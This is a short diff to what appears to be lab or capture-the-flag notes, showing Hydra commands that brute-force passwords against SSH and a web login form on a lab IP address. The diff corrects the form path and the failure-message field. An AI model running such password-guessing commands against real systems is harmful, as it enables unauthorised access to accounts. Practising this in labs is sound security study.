@@ -7,5 +7,5 @@ SSH
 > hydra -l {UserName} -P {Wordlist path} 10.10.149.128 -t 4 ssh
 
 Post Web Form
-> hydra -l {UserName} -P {Wordlist path} 10.10.149.128 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+> hydra -l {UserName} -P {Wordlist path} 10.10.149.128 http-post-form "/login:username=^USER^&password=^PASS^:{Add incorrect message from web page here}" -V
 
